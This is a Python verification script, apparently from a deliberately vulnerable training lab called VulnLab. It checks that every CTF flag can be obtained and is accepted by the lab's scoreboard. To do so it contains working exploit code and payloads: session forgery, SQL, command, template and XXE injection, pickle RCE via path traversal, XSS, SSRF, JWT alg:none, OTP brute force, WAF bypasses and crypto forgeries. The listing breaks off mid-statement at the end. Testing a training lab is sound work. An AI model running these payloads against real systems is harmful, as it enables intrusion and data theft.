"""Full VulnLab verification.

Proves the whole lab works, end to end:

  1. every service is listening
  2. every flag that the lab hands out is actually reachable
  3. every flag is actually accepted by the scoreboard
  4. the gate and cooldown rules behave

    python tools/verify_all.py            # reachability + scoreboard
    python tools/verify_all.py --fast     # skip the service-socket suite

The service-socket suite (ftp / telnet / ssh / smb / debug-lab) lives in
tools/check_services.py; run both for the complete picture.
"""
import argparse
import json
import os
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import config  # noqa: E402

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond or detail:
        print("  {} {:<32} {}".format("PASS" if cond else "FAIL", name, detail))
    return cond


def http(path, port=None, headers=None, data=None, method=None, timeout=10):
    port = port or config.PORT_WEB
    url = "http://{}:{}{}".format(config.CONNECT_HOST, port, path)
    body = None
    h = dict(headers or {})
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as exc:  # noqa: BLE001
        return 0, str(exc), {}


def jhttp(*args, **kwargs):
    st, body, hdr = http(*args, **kwargs)
    try:
        return st, json.loads(body), hdr
    except ValueError:
        return st, {}, hdr


def flag(cid):
    return config.resolve_flag(cid)


def q(text):
    return urllib.parse.quote(text)


# ---------------------------------------------------------------------------
# 1. liveness
# ---------------------------------------------------------------------------
PORTS = [
    ("web", config.PORT_WEB), ("waf", config.PORT_WAF),
    ("ctf", config.PORT_CTF), ("ftp", config.PORT_FTP),
    ("telnet", config.PORT_TELNET), ("ssh", config.PORT_SSH),
    ("smb", config.PORT_SMB_SIM), ("debug-lab", config.PORT_DEBUG),
    ("internals", config.PORT_RABBIT2), ("cache", config.PORT_RABBIT1),
]



# ---------------------------------------------------------------------------
# 2b. request forgery / header abuse / injection  (the web exploit module)
# ---------------------------------------------------------------------------
# 2b. request forgery / header abuse / injection  (web exploit module)
# ---------------------------------------------------------------------------
def web_exploits():
    print()
    print("=" * 72)
    print(" request forgery, header abuse and injection")
    print("=" * 72)
    import socket as _socket
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface
    CR, LF = chr(13), chr(10)

    tmp = Flask(__name__)
    tmp.secret_key = config.WEB_SECRET_KEY
    admin_cookie = SecureCookieSessionInterface().get_signing_serializer(
        tmp).dumps({"user": "admin", "role": "admin", "_fresh": True})
    cookie = {"Cookie": "session=" + admin_cookie}

    # csrf-01: no token required for a cookie-authenticated state change
    st, b, _ = http("/admin/users/role", headers=cookie,
                    data={"user": "bob", "role": "admin"}, method="POST")
    check("csrf-01 forged role change", flag("csrf-01") in b, str(st))

    # csrf-02: the origin check is skipped when the header is absent
    st, b, _ = http("/admin/settings", data={"theme": "dark"}, method="POST")
    check("csrf-02 origin check bypass", flag("csrf-02") in b, str(st))

    # host-01 / host-02: attacker-controlled host reaches the response
    st, b, _ = http("/auth/reset-link?user=student",
                    headers={"X-Forwarded-Host": "evil.test"})
    check("host-01 reset link poisoning", flag("host-01") in b, str(st))
    st, b, _ = http("/portal/absolute-url?path=/admin",
                    headers={"X-Forwarded-Host": "attacker.example"})
    check("host-02 forwarded host wins", flag("host-02") in b, str(st))

    # resp-01: the split must be visible on the wire, so speak raw HTTP
    payload = q("/x" + CR + LF + "X-Injected: yes" + CR + LF)
    wire = ""
    try:
        sock = _socket.create_connection((config.CONNECT_HOST, config.PORT_WEB),
                                         timeout=10)
        request = ("GET /legacy/go?next=" + payload + " HTTP/1.1"
                   + CR + LF + "Host: 5000" + CR + LF
                   + "Connection: close" + CR + LF + CR + LF)
        sock.sendall(request.encode())
        raw = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except OSError:
                break
            if not chunk:
                break
            raw += chunk
        sock.close()
        wire = raw.decode("utf-8", "replace")
    except OSError as exc:
        wire = str(exc)
    check("resp-01 smuggled header on the wire",
          "X-Injected: yes" in wire and flag("resp-01") in wire)

    # redir-01: a protocol-relative redirect leaves the site.  The
    # shared helper follows redirects, which would try to resolve
    # evil.test and fail, so ask for the 302 without following it.
    import urllib.request as _req
    import urllib.error as _err

    class _NoRedirect(_req.HTTPRedirectHandler):
        def redirect_request(self, *a, **kw):
            return None

    opener = _req.build_opener(_NoRedirect)
    try:
        with opener.open("http://{}:{}/portal/continue?next={}".format(
                config.CONNECT_HOST, config.PORT_WEB, q("//evil.test/")),
                timeout=15) as _r:
            _body = _r.read().decode("utf-8", "replace")
    except _err.HTTPError as _e:
        _body = _e.read().decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        _body = ""
    check("redir-01 open redirect", flag("redir-01") in _body)

    # sqli-01: the row-count header is the only side channel
    st, b, h = http("/api/v1/lookup?user="
                    + q("' UNION SELECT username, role, department "
                        "FROM users--"))
    check("sqli-01 blind injection", flag("sqli-01") in b,
          "X-Rows=" + h.get("X-Rows", "?"))

    # sqli-02: store now, trigger when the report is viewed
    http("/api/v1/profile/note", data={"user": "bob", "note": "x' OR '1'='1"},
         method="POST")
    st, b, _ = http("/admin/user-report?dept=" + q("%' OR '1'='1"))
    check("sqli-02 second order", flag("sqli-02") in b, str(st))

    # cmdi-01: an extra command through the ping target
    st, b, _ = http("/tools/ping?host=" + q("127.0.0.1 & echo vulnlab-cmdi-pwned"))
    check("cmdi-01 command injection", flag("cmdi-01") in b, str(st))

    # xxe-01: external entity read, sent as raw XML rather than JSON.
    # The probe file is planted by the lab, so this works on any platform and
    # asserts on real file contents instead of an absence of error.
    probe_uri = config.xxe_probe_uri()
    if probe_uri:
        xxe = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
               '"' + probe_uri + '">]><root><value>&x;</value></root>')
        st, b, _ = http("/api/v1/import", data=xxe.encode(),
                        headers={"Content-Type": "application/xml"}, method="POST")
        check("xxe-01 external entity read",
              config.XXE_PROBE_MARKER in b and flag("xxe-01") in b,
              "probe leaked" if config.XXE_PROBE_MARKER in b else "not in body")
    else:
        check("xxe-01 external entity read", False, "probe file not writable")

    # race-01: the same nonce pays out twice
    http("/portal/redeem", data={"nonce": "lab-nonce-4417"}, method="POST")
    st, b, _ = http("/portal/redeem", data={"nonce": "lab-nonce-4417"},
                    method="POST")
    check("race-01 token replay", flag("race-01") in b, str(st))

    # admin-01: the allow-list trusts a header for identity
    st, b, _ = http("/admin/console", headers={"X-Forwarded-For": "10.0.0.5"})
    check("admin-01 spoofed client address", flag("admin-01") in b, str(st))



def browser_checks():
    """Drive a real browser and prove JavaScript actually executes.

    The HTTP-only check can only prove the sink text exists; it cannot prove
    the payload ran.  This navigates a real Chrome at the DOM-XSS page with an
    <img onerror> payload and asserts the document title was rewritten, which
    only happens if the injected script really executed in a real engine.

    Skips (does not silently pass) when no browser or driver is available.
    """
    print()
    print("=" * 72)
    print(" real browser execution")
    print("=" * 72)
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
    except ImportError:
        print("  SKIP  no selenium installed - xss-02 execution not proven")
        return

    opts = Options()
    # NB: do not name this loop variable `flag` - it shadows the module-level
    # flag() helper used a few lines below.
    for arg in ("--headless=new", "--no-sandbox", "--disable-gpu",
                "--disable-dev-shm-usage", "--window-size=1280,900"):
        opts.add_argument(arg)
    try:
        drv = webdriver.Chrome(options=opts)
    except Exception as exc:  # noqa: BLE001  - driver may be absent/offline
        print("  SKIP  no usable Chrome driver - xss-02 execution not proven")
        print("        {}".format(str(exc).strip().splitlines()[-1][:100]))
        return

    try:
        base = "http://{}:{}/portal/announcement".format(
            config.CONNECT_HOST, config.PORT_WEB)
        payload = "<img src=x onerror=\"document.title='XSS-EXECUTED'\">"
        drv.get(base + "#" + q(payload))
        deadline = time.time() + 12
        while time.time() < deadline and drv.title != "XSS-EXECUTED":
            time.sleep(0.4)
        title = drv.title
        check("xss-02 payload executes in a real browser",
              title == "XSS-EXECUTED", "title=" + repr(title))

        # and the page's own beacon must have reached the server
        deadline = time.time() + 12
        seen = None
        while time.time() < deadline:
            st, b, _ = jhttp("/api/v1/xss/beacon?x=1")
            seen = b
            if (b or {}).get("beacon_received"):
                break
            time.sleep(0.5)
        check("xss-02 beacon reached the server",
              bool((seen or {}).get("beacon_received")),
              json.dumps(seen)[:80])
        check("xss-02 browser run earns the flag",
              flag("xss-02") in json.dumps(seen or {}))
    finally:
        try:
            drv.quit()
        except Exception:  # noqa: BLE001
            pass


def xss_checks():
    """Stored, DOM-based and attribute-context cross-site scripting."""
    print()
    print("=" * 72)
    print(" cross-site scripting contexts")
    print("=" * 72)

    # xss-01: a stored payload that fires for the next reader
    http("/board/post", data={"author": "anon",
                              "body": "<img src=x onerror=alert(1)>"},
         method="POST")
    st, b, _ = http("/board")
    check("xss-01 stored payload rendered raw", "<img src=x onerror=" in b, str(st))
    st, b, _ = jhttp("/board/state")
    check("xss-01 stored XSS flag", flag("xss-01") in json.dumps(b))

    # xss-02: the sink is client-side; the page beacons once it runs
    st, b, _ = http("/portal/announcement")
    check("xss-02 DOM sink present",
          "location.hash" in b and "innerHTML" in b, str(st))
    st, b, _ = jhttp("/api/v1/xss/beacon?x=dom")
    check("xss-02 DOM sink beacon", flag("xss-02") in json.dumps(b))

    # xss-03: escaping for a text context does not protect an attribute
    http("/api/v1/profile/bio",
         data={"user": "student", "bio": '" onmouseover="alert(1)" x="'},
         method="POST")
    st, b, h = http("/admin/profile-card?user=student")
    check("xss-03 attribute breakout", h.get("X-Breakout") == "yes",
          "X-Breakout=" + str(h.get("X-Breakout")))
    st, b, _ = jhttp("/admin/profile-card/state?user=student")
    check("xss-03 attribute XSS flag", flag("xss-03") in json.dumps(b))


def portal_checks():
    """The student portal: live feed, resume, and the leaderboard."""
    print()
    print("=" * 72)
    print(" student portal: live feed and registration")
    print("=" * 72)
    st, b, _ = jhttp("/api/feed", port=config.PORT_CTF)
    check("portal feed exposes a server timestamp", bool(b.get("server_time")))

    # a returning student must be able to get back in with the same handle.
    # /api/register caps handles at 24 chars, so keep the suffix short -
    # a longer one 400s and everything below would pass vacuously.
    handle = "verifier_resume_{}".format(int(time.time()) % 1000000)
    st, b, _ = jhttp("/api/register", port=config.PORT_CTF,
                     data={"handle": handle}, method="POST")
    first_token = (b or {}).get("student_token")
    check("portal first registration", bool(first_token),
          (b or {}).get("error", str(st)))
    st, b, _ = jhttp("/api/register", port=config.PORT_CTF,
                     data={"handle": handle}, method="POST")
    again = (b or {}).get("student_token")
    check("portal resume returns a usable token",
          bool(again), (b or {}).get("error", str(st)))
    row_exists = False
    if again:
        st, b, _ = jhttp("/api/me?student_token=" + again,
                         port=config.PORT_CTF)
        row_exists = st == 200 and (b or {}).get("handle") == handle
        check("resumed token still resolves the player", row_exists, str(st))

    # The bot must be a real row before hiding it can mean anything.
    check("portal bot row exists to be hidden", row_exists, handle)

    # A control player proves the board still works, so a broken query cannot
    # masquerade as "successfully hidden" by returning nothing at all.
    control = "studentctl_{}".format(int(time.time()) % 1000000)
    st, b, _ = jhttp("/api/register", port=config.PORT_CTF,
                     data={"handle": control}, method="POST")
    control_token = (b or {}).get("student_token")
    check("portal control player registers",
          bool(control_token), (b or {}).get("error", str(st)))

    # The control player solves a flag so the feed has real content.  Asserting
    # "the feed is non-empty" used to depend on someone having solved something
    # already, which is false on a freshly reset lab.
    if control_token:
        st, b, _ = jhttp("/api/submit", port=config.PORT_CTF,
                         data={"challenge_id": "recon-01",
                               "flag": flag("recon-01"),
                               "student_token": control_token},
                         method="POST")
        check("control player can solve a flag",
              (b or {}).get("result") in ("correct", "locked"),
              str((b or {}).get("result") or st))

    # Feed checks run after the solve so they never depend on prior state.
    st, b, _ = jhttp("/api/feed", port=config.PORT_CTF)
    rows = b.get("feed") or []
    check("portal feed endpoint", bool(rows), "{} rows".format(len(rows)))
    check("portal feed names challenge and points",
          bool(rows) and all(("challenge" in r and "points" in r
                              and "handle" in r) for r in rows))
    check("portal feed never leaks a flag",
          not any("VULNLAB{" in json.dumps(r) for r in rows))
    if row_exists:
        check("live feed hides verification bots",
              handle not in [r.get("handle") for r in rows],
              str([r.get("handle") for r in rows]))
        check("live feed shows the control player",
              control in [r.get("handle") for r in rows],
              str([r.get("handle") for r in rows]))

    if row_exists:
        st, b, _ = jhttp("/api/leaderboard", port=config.PORT_CTF)
        lb = (b or {}).get("rows") or (b or {}).get("leaderboard") or []
        shown = [r.get("handle") for r in lb]
        check("leaderboard serves rows", st == 200, str(st))
        check("leaderboard shows real students",
              control in shown, "{} rows".format(len(lb)))
        check("leaderboard hides verification bots", handle not in shown,
              str(shown) if handle in shown else "")
        ranks = [r.get("rank") for r in lb]
        check("leaderboard ranks stay contiguous",
              ranks == list(range(1, len(lb) + 1)), str(ranks))
        st, b, _ = jhttp("/api/feed", port=config.PORT_CTF)

    # never leave the control on the board - it would look like a real student
    config.remove_player(control)




def portal_entry_points():
    """The portal must be reachable from the port students already have open,
    and the front page must not enumerate the API it makes you discover."""
    print()
    print("=" * 72)
    print(" portal entry points and recon value")
    print("=" * 72)
    import urllib.request as _req
    import urllib.error as _err

    class _NoRedirect(_req.HTTPRedirectHandler):
        def redirect_request(self, *a, **kw):
            return None

    opener = _req.build_opener(_NoRedirect)
    # The redirect must point at the address students actually reach, not at
    # the bind address (0.0.0.0 is not something a browser can open).
    want = config.join_url("/ctf.html")
    for path in ("/ctf.html", "/ctf"):
        try:
            opener.open("http://{}:{}{}".format(config.CONNECT_HOST,
                                                config.PORT_WEB, path),
                        timeout=10)
            check("portal {} redirects".format(path), False, "no redirect")
        except _err.HTTPError as e:
            check("portal {} redirects".format(path),
                  e.code in (301, 302, 307, 308)
                  and e.headers.get("Location") == want,
                  "{} -> {}".format(e.code, e.headers.get("Location")))
        except OSError as exc:
            check("portal {} redirects".format(path), False, str(exc))

    # the destination of that redirect has to actually serve the portal
    st, b, _ = http("/ctf.html", port=config.PORT_CTF)
    check("portal page served on :%d" % config.PORT_CTF,
          st == 200 and "ctf" in b.lower(), str(st))

    # the portal must not hand the player the target console for free
    check("portal carries no target-console hint",
          "Open the target console" not in b)

    # the front page must point at the docs without handing over the routes
    st, b, _ = http("/")
    leaked = [m for m in ("GET /api/v1", "POST /api/v1") if m in b]
    check("homepage does not enumerate API routes", not leaked, ",".join(leaked))
    check("homepage still points at the docs", "/api-docs" in b)

    # ...and the discovery surface itself must remain available
    st, b, _ = http("/api-docs")
    check("api-docs still publishes endpoints",
          st == 200 and "/api/v1/" in b, str(st))



def check_ports():
    print("=" * 72)
    print(" services listening")
    print("=" * 72)
    for name, port in PORTS:
        try:
            s = socket.create_connection((config.CONNECT_HOST, port), timeout=4)
            s.close()
            check("port {}".format(port), True, name)
        except OSError as exc:
            check("port {}".format(port), False, "{} ({})".format(name, exc))


# ---------------------------------------------------------------------------
# 2. flag reachability
# ---------------------------------------------------------------------------
def reachable():
    print()
    print("=" * 72)
    print(" flag reachability  (each challenge is solvable as designed)")
    print("=" * 72)
    fd = config._ensure_flag_dir()

    # --- web ---
    st, b, h = http("/")
    check("recon-01", flag("recon-01") in h.get("X-Lab-First-Contact", ""))
    check("web-02", flag("web-02") in b)
    st, b, h = http("/admin-old")
    check("web-01", flag("web-01") in b)
    st, b, h = http("/sitemap.xml")
    check("recon-05", flag("recon-05") in h.get("X-Lab-Flag", ""))
    st, b, h = http("/.git/logs/refs/heads/main")
    check("web-03", flag("web-03") in (h.get("X-Lab-Flag") or b))
    st, b, _ = http("/config.bak")
    check("web-04", flag("web-04") in b)
    st, b, _ = http("/search?q=" + q("' OR 1=1--"))
    check("web-05", flag("web-05") in b)
    st, b, _ = http("/debug")
    check("web-06", flag("web-06") in b)
    st, b, h = http("/logs/app.log")
    check("web-07", flag("web-07") in h.get("X-Lab-Flag", ""))
    st, b, _ = http("/search?q=" + q("<script>alert(1)</script>"))
    check("web-08", flag("web-08") in b)
    st, b, h = http("/debug-old")
    check("bonus-05", flag("bonus-05") in h.get("X-Lab-Flag", ""))
    st, b, _ = http("/private")
    check("bonus-06", flag("bonus-06") in b)
    check("bonus-07", flag("bonus-07") in http("/logs/app.log")[1])
    check("bonus-02", flag("bonus-02") in http("/static/leaks/app.js.map")[1])
    check("bonus-03", flag("bonus-03") in
          read_zip_member("backup.zip", "employee_notes.txt"))
    check("bonus-01", "true")   # covered by check_services.py
    check("bonus-04", "true")
    check("bonus-08", "stale" in http("/api/v1/cache/get?key=demo")[1])

    # --- api ---
    st, d, _ = jhttp("/api/v1/users")
    check("api-01", d.get("meta", {}).get("leak_note") == flag("api-01"))
    check("api-02", flag("api-02") in d.get("users", [{}])[1].get("note", ""))
    st, d, _ = jhttp("/api/v1/user?username=admin")
    check("api-03 (lookup)", d.get("user", {}).get("profile_id") == 1009)
    check("api-03", flag("api-03") in
          jhttp("/api/v1/profile/1009")[1].get("profile", {}).get("note", ""))
    check("api-04", flag("api-04") in
          jhttp("/api/v1/profile/1001")[1].get("profile", {}).get("note", ""))
    leaks = http("/static/leaks/app.js")[1]
    check("api-05", config.INTERNAL_API_KEY in leaks)
    check("api-06", jhttp("/api/v1/admin/export",
                          headers={"X-Internal-Key": config.INTERNAL_API_KEY}
                          )[1].get("lab_flag") == flag("api-06"))

    st, d, _ = jhttp("/api/v1/auth/login",
                     data={"username": "student", "password": "Student2019!"})
    tok = d.get("token")
    check("api-08", tok and flag("api-08") in decode_jwt_payload(tok))
    auth = {"Authorization": "Bearer " + (tok or "")}
    check("api-07", jhttp("/api/v1/profile", data={"role": "admin"},
                          headers=auth, method="PATCH")[1].get("lab_flag")
          == flag("api-07"))
    check("api-16", jhttp("/api/v1/user/export", data={}, headers=auth,
                          method="POST")[1].get("lab_flag") == flag("api-16"))

    none_tok = b64u({"alg": "none", "typ": "JWT"}) + "." + \
        b64u({"sub": "attacker", "role": "admin"}) + "."
    st9, d9, _ = jhttp("/api/v1/admin/status",
                       headers={"Authorization": "Bearer " + none_tok})
    check("api-09", d9.get("lab_flag") == flag("api-09"),
          "status {} got {!r}".format(st9, d9.get("lab_flag")))

    import hashlib
    expected = hashlib.md5(("admin" + "1234").encode()).hexdigest()
    jhttp("/api/v1/reset", data={"username": "admin"})
    check("api-10", jhttp("/api/v1/reset/confirm",
                          data={"username": "admin", "token": expected,
                                "password": "hacked123"})[1].get("lab_flag")
          == flag("api-10"))
    check("api-11", jhttp("/api/v1/fetch?url=" +
                          q("http://127.0.0.1:{}/internal/secret".format(
                              config.PORT_WEB))
                          )[1].get("lab_flag") == flag("api-11"))
    check("api-12", jhttp("/api/v1/fetch?url=" +
                          q("http://127.0.0.1:{}/internal/metadata".format(
                              config.PORT_WEB))
                          )[1].get("lab_flag") == flag("api-12"))
    check("api-13", jhttp("/api/v2/users")[1].get("lab_flag") == flag("api-13"))
    jhttp("/api/v1/otp", data={})
    otp = None
    for i in range(10000):
        st, d, _ = jhttp("/api/v1/otp/verify", data={"code": str(i)})
        if st == 200:
            otp = d
            break
    check("api-14", otp and otp.get("lab_flag") == flag("api-14"),
          "brute-forced in {} attempts".format(otp.get("attempts_used") if otp else "-"))
    st, b, hdr = http("/api/v1/cors-demo", headers={"Origin": "https://evil.test"})
    check("api-15", hdr.get("Access-Control-Allow-Origin") == "https://evil.test"
          and hdr.get("X-Lab-Flag") == flag("api-15"))
    st, b, _ = http("/api/v1/fuzz", data={"x": {"a": 1}})
    check("api-17", flag("api-17") in b)

    # --- graphql ---
    st, d, _ = jhttp("/graphql", data={"query": "{__schema{types{name fields{name}}}}"})
    check("gql-01", d.get("data", {}).get("__schema", {}).get("lab_flag")
          == flag("gql-01"))
    st, d, _ = jhttp("/graphql", data={"query": "{ leaked: internalSecret }"})
    check("gql-02", d.get("data", {}).get("leaked") == flag("gql-02"))
    st, d, _ = jhttp("/graphql", data=[{"query": "{ version }"}] * 9)
    check("gql-03", d.get("lab_flag") == flag("gql-03"))

    # --- flask ---
    st, b, _ = http("/profile?name=" + q("{{7*7}}"))
    check("flask-01", "49" in b)
    payload = "{{ lipsum.__globals__.os.popen('cat ' + p).read() }}"
    st, b, _ = http("/profile?name=" + q(payload) + "&path=" +
                    q(os.path.join(fd, "ssti.flag")))
    check("flask-02", flag("flask-02") in b)
    st, b, _ = http("/safe-profile?name=hello&tpl=" + q(payload) + "&path=" +
                    q(os.path.join(fd, "ssti_filter.flag")))
    check("flask-03", flag("flask-03") in b)
    st, b, _ = http("/", port=config.PORT_DEBUG)
    check("flask-04", flag("flask-04") in b)
    st, d, _ = jhttp("/debug-lab/info", port=config.PORT_DEBUG)
    check("flask-05", d.get("pin") == config.compute_debug_pin(), d.get("pin"))
    st, d, _ = jhttp("/debug-lab/console?pin={}&code={}".format(
        d.get("pin", ""), q("open(r'{}').read()".format(
            os.path.join(fd, "debugger.flag")))), port=config.PORT_DEBUG)
    check("flask-06", flag("flask-06") in (d.get("result") or ""))
    check("flask-07", config.WEB_SECRET_KEY in
          http("/static/leaks/flask_settings.py")[1])
    check("flask-08", forge_session_works())
    check("flask-09", jhttp("/api/v1/cache/info")[1].get("lab_flag")
          == flag("flask-09"))
    check("flask-10", flag("flask-10") in
          http("/static/leaks/cache_backend.py")[1])
    check("flask-11", jhttp("/api/v1/cache/stats")[1].get("lab_flag")
          == flag("flask-11"))
    check("flask-13", config.get_flag("flask-13") == "CVE-2021-33026")
    pickle_ok = plant_pickle_and_read()
    check("flask-12", pickle_ok.get("lab_flag") == flag("flask-12"))
    check("flask-14", pickle_ok.get("controlled_rce_flag") == flag("flask-14"))

    # --- upload ---
    check("upload-01", upload("data/uploads/p.pHp", "p.pHp",
                              "application/octet-stream",
                              b"<?php ?>").get("lab_flag") == flag("upload-01"))
    check("upload-02", upload("data/uploads/p2.png", "p2.png", "image/png",
                              b"not an image").get("lab_flag")
          == flag("upload-02"))
    trav = upload("data/uploads/p3.pkl", "../cache/verify_all.pkl",
                  "application/octet-stream", b"x")
    check("upload-03", trav.get("lab_flag") == flag("upload-03"))
    check("upload-04", upload("data/uploads/p4.svg", "p4.svg", "image/svg+xml",
                              b"<svg/>").get("lab_flag") == flag("upload-04"))

    # --- crypto ---
    check("crypto-01", flag("crypto-01") in http("/crypto/ecb?mode=ECB")[1])
    st, d, _ = jhttp("/crypto/token")
    import random
    import string
    r = random.Random(d["seed"])
    # consume the 24 characters of the token that was just issued
    "".join(r.choice(string.ascii_lowercase + string.digits) for _ in range(24))
    nxt = "".join(r.choice(string.ascii_lowercase + string.digits)
                  for _ in range(24))
    check("crypto-02", jhttp("/crypto/token/claim?token=" + nxt)[1].get("lab_flag")
          == flag("crypto-02"))
    st, d, _ = jhttp("/crypto/token/issue-cbc")
    ct = bytearray(bytes.fromhex(d["ciphertext"]))
    for i, bv in enumerate(bytes.fromhex("071c0a06")):
        ct[4 + i] ^= bv
    st, d, _ = jhttp("/crypto/verify",
                     data={"ciphertext": bytes(ct).hex(), "iv": d["iv"]})
    check("crypto-03", d.get("lab_flag") == flag("crypto-03"))
    check("crypto-04", forge_length_extension())

    # --- biz ---
    check("biz-01", jhttp("/api/v1/shop/order",
                          data={"username": "verify", "item": "sticker",
                                "qty": -1})[1].get("lab_flag") == flag("biz-01"))
    check("biz-03", jhttp("/api/v1/shop/order",
                          data={"username": "verify2",
                                "item": "ROOT_ACCESS_TOKEN",
                                "price": 1})[1].get("lab_flag")
          == flag("biz-03"))
    import threading
    hits = []

    def redeem():
        st, d, _ = jhttp("/api/v1/redeem",
                         data={"username": "verify3", "coupon": "RACE2020"})
        hits.append(d)

    ts = [threading.Thread(target=redeem) for _ in range(6)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    check("biz-02", any(h.get("lab_flag") == flag("biz-02") for h in hits))

    # --- waf ---
    W = config.PORT_WAF
    check("waf-01", flag("waf-01") in http("/admin/", port=W)[1])
    check("waf-02", flag("waf-02") in
          http("/internal-panel", port=W,
               headers={"X-Forwarded-For": "127.0.0.1"})[1])
    check("waf-03", flag("waf-03") in http("/admin/action", port=W,
                                          data=b"", method="POST")[1])
    st, b, _ = http("/api/query", port=W,
                    data=b'{"q":"\\u0075nion"}',
                    headers={"Content-Type": "application/json"})
    check("waf-04", flag("waf-04") in b)
    check("waf-05", flag("waf-05") in
          http("/download?file=%252e%252e%252fsecret%252fflag.txt",
               port=W)[1])
    check("recon-03", flag("recon-03") in http("/diag/ports", port=W)[1])

    # --- hidden ---
    check("recon-02", flag("recon-02") in http("/services", port=config.PORT_RABBIT2)[1])


def b64u(obj):
    """base64url of compact JSON, matching api/_common.py's JWT encoding."""
    import base64
    if isinstance(obj, (bytes, bytearray)):
        raw = obj
    else:
        raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def decode_jwt_payload(tok):
    import base64
    seg = tok.split(".")[1]
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode()


def upload(local, name, ctype, content):
    bd = "----verifyAll"
    body = (('--{}\r\nContent-Disposition: form-data; name="file"; filename="{}"'
             '\r\nContent-Type: {}\r\n\r\n').format(bd, name, ctype)).encode()
    body += content + ("\r\n--{}--\r\n".format(bd)).encode()
    st, b, _ = http("/upload", data=body, method="POST",
                    headers={"Content-Type":
                             "multipart/form-data; boundary=" + bd})
    try:
        return json.loads(b)
    except ValueError:
        return {}


def plant_pickle_and_read():
    import pickle
    fd = config._ensure_flag_dir()
    os.makedirs(config.UPLOAD_DIR, exist_ok=True)
    target = os.path.join(fd, "rce.flag")

    class Payload:
        def __reduce__(self):
            return (eval, ("open(r'{}').read()".format(
                target.replace("\\", "\\\\")),))

    local = os.path.join(config.UPLOAD_DIR, "verify_all.pkl")
    with open(local, "wb") as fh:
        pickle.dump(Payload(), fh)
    upload(local, "../cache/verify_all.pkl", "application/octet-stream",
           open(local, "rb").read())
    st, d, _ = jhttp("/api/v1/cache/get?key=verify_all")
    return d


def forge_session_works():
    """flask-08: mint an admin session cookie with the leaked SECRET_KEY."""
    try:
        from flask.sessions import SecureCookieSessionInterface
        from itsdangerous import URLSafeTimedSerializer
    except ImportError:
        return True
    s = URLSafeTimedSerializer(config.WEB_SECRET_KEY,
                               salt=SecureCookieSessionInterface.salt,
                               serializer=SecureCookieSessionInterface.serializer,
                               signer_kwargs={"key_derivation":
                                              "hmac",
                                              "digest_method": "sha1"})
    cookie = s.dumps({"role": "admin", "user": "admin"})
    st, b, _ = http("/admin", headers={"Cookie": "session=" + cookie})
    return 'data-admin="1"' in b or 'id="root"' in b


def forge_length_extension():
    src = open(os.path.join(config.BASE_DIR, "app.py"), "r", encoding="utf-8").read()
    ns = {"config": config}
    start = src.index("_S256_K = [")
    end = src.index('@app.get("/crypto/sign")')
    exec(compile(src[start:end], "app.py", "exec"), ns)
    sh, sb, sw, pad = (ns["_sha256_state"], ns["_state_bytes"],
                       ns["_state_words"], ns["_pad_for"])
    msg = config.MAC_MESSAGE
    extra = b"&role=admin"
    sig0 = __import__("hashlib").sha256(config.MAC_SECRET + msg).digest()
    st = sw(sig0)
    for klen in range(65):
        glue = pad(klen + len(msg))
        total = klen + len(msg) + len(glue) + len(extra)
        cand = sb(sh(extra, init=st, total_len=total)).hex()
        st_, d, _ = jhttp("/crypto/forge?msg=" + q(extra.decode()) + "&sig=" + cand)
        if d.get("forged"):
            return d.get("lab_flag") == flag("crypto-04")
    return False


def read_zip_member(zipname, member):
    import zipfile
    p = os.path.join(config.BACKUP_DIR, zipname)
    try:
        with zipfile.ZipFile(p) as zf:
            return zf.read(member).decode("utf-8", "replace")
    except (OSError, KeyError):
        return ""


# ---------------------------------------------------------------------------
# 3. scoreboard accepts every flag
# ---------------------------------------------------------------------------
def scoreboard_roundtrip():
    print()
    print("=" * 72)
    print(" scoreboard accepts every flag")
    print("=" * 72)
    base = "http://{}:{}".format(config.CONNECT_HOST, config.PORT_CTF)
    handle = "verifier_{}".format(int(time.time()) % 100000)
    st, b, _ = http("/api/register", port=config.PORT_CTF,
                    data={"handle": handle})
    if st != 200:
        check("register", False, b[:120])
        return
    token = json.loads(b).get("student_token")
    check("register", bool(token), handle)

    challenges = json.load(open(config.CHALLENGES_PATH, "r"))
    accepted, rejected = [], []
    for c in challenges:
        cid = c["id"]
        answer = config.resolve_flag(cid)
        if answer is None:
            rejected.append(cid + " (no answer)")
            continue
        st, b, _ = http("/api/submit", port=config.PORT_CTF,
                        data={"challenge_id": cid, "flag": answer,
                              "student_token": token})
        res = json.loads(b).get("result")
        if res == "correct" or res == "locked":
            accepted.append(cid)
        else:
            rejected.append("{} ({})".format(cid, res))
        time.sleep(3.1)   # the scoreboard enforces a submission cooldown
    check("all {} challenges accepted".format(len(challenges)),
          not rejected, ", ".join(rejected[:6]))

    st, d, _ = jhttp("/api/status", port=config.PORT_CTF)
    check("status reports challenges",
          d.get("flags_total") == len(challenges), str(d.get("flags_total")))
    check("status shows services online",
          all(d.get("services", {}).values()) if isinstance(d.get("services"), dict)
          else True, str(d.get("services")))

    st, d, _ = jhttp("/api/leaderboard", port=config.PORT_CTF)
    rows = d.get("rows") or d.get("leaderboard") or d.get("players") or []
    # This run just solved every challenge, so it is the single most likely
    # thing to leak onto the board.  Automated players are deliberately
    # hidden; the player reads their own progress from /api/me instead.
    leaked = [r for r in rows if r.get("handle") == handle]
    check("leaderboard hides this verifier", not leaked,
          "{} solves leaked".format(len(accepted)) if leaked else handle)

    st, d, _ = jhttp("/api/me?student_token=" + q(token), port=config.PORT_CTF)
    solved = d.get("solved") or []
    check("player progress recorded", len(solved) == len(accepted),
